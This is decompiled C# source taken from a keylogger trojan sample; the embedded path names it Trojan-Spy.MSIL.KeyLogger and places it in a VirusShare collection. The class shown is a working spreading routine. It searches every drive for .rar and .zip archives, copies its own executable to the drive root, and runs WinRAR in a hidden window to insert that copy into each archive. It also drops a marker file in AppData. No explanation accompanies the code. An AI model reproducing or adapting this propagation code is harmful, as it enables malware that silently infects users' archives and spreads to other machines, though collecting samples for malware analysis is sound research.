// Decompiled with JetBrains decompiler
// Type: Roy.RAR
// Assembly: Roy, Version=2.3.3.234, Culture=neutral, PublicKeyToken=null
// MVID: 2E5855C9-3623-47AC-87B3-574423C889E6
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00002-msil\Trojan-Spy.MSIL.KeyLogger.ghj-a49d165972c0534f6ef5730aa1e0dd66ae9dc93656c6cd8ad725852281757a19.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace Roy
{
  [StandardModule]
  internal sealed class RAR
  {
    private static string _rarPath;
    private static string _copiedExeName;

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern int GetShortPathName(
      [MarshalAs(UnmanagedType.LPTStr)] string path,
      [MarshalAs(UnmanagedType.LPTStr)] StringBuilder shortPath,
      int shortPathLength);

    private static void Search(string pathName)
    {
      string[] files = Directory.GetFiles(pathName);
      int index1 = 0;
      while (index1 < files.Length)
      {
        string archiveToInject = files[index1];
        if (archiveToInject.Contains(".rar"))
          RAR.RarStart(archiveToInject);
        if (archiveToInject.Contains(".zip"))
          RAR.RarStart(archiveToInject);
        checked { ++index1; }
      }
      string[] directories = Directory.GetDirectories(pathName);
      int index2 = 0;
      while (index2 < directories.Length)
      {
        RAR.Search(directories[index2]);
        checked { ++index2; }
      }
    }

    public static void Spread(string myExeName)
    {
      RAR._copiedExeName = myExeName;
      string[] logicalDrives = Environment.GetLogicalDrives();
      int index = 0;
      while (index < logicalDrives.Length)
      {
        RAR.Search(logicalDrives[index]);
        checked { ++index; }
      }
      File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\temp48.txt");
    }

    public static void RarStart(string archiveToInject)
    {
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
      string path1 = folderPath.Replace(folderPath.Substring(folderPath.IndexOf("\\")), string.Empty) + "\\";
      RAR._rarPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\WinRAR\\WinRAR.exe";
      if (!File.Exists(RAR._rarPath))
        return;
      if (!File.Exists(Path.Combine(path1, RAR._copiedExeName)))
        File.Copy(Process.GetCurrentProcess().MainModule.FileName, Path.Combine(path1, RAR._copiedExeName));
      StringBuilder shortPath1 = new StringBuilder((int) byte.MaxValue);
      RAR.GetShortPathName(Path.Combine(path1, RAR._copiedExeName), shortPath1, shortPath1.Capacity);
      string str1 = shortPath1.ToString();
      StringBuilder shortPath2 = new StringBuilder((int) byte.MaxValue);
      RAR.GetShortPathName(archiveToInject, shortPath2, shortPath2.Capacity);
      try
      {
        ProcessStartInfo startInfo = new ProcessStartInfo();
        string str2 = " a " + shortPath2.ToString() + " " + str1;
        startInfo.FileName = RAR._rarPath;
        startInfo.Arguments = str2;
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
        Process.Start(startInfo);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
